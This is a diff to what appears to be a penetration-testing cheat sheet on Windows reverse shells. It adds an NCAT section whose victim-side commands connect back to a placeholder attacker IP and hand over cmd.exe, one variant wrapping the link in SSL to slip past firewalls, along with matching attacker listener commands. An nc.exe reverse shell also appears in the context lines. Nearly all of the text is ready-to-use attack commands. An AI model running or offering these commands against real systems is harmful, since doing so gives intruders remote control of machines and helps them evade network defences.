@@ -33,6 +33,19 @@ Obviously, **there aren't SUID files or sudo privileges in Windows**, but it's u
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
+## NCAT
+victim
+```
+ncat.exe <Attacker_IP> <PORT>  -e cmd.exe
+#Encryption to bypass firewall
+ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e cmd.exe
+```
+attacker
+```
+ncat -l <PORT 443>
+#Encryption to bypass firewall
+ncat -l <PORT eg.443> --ssl
+```
 
 ## SBD
 
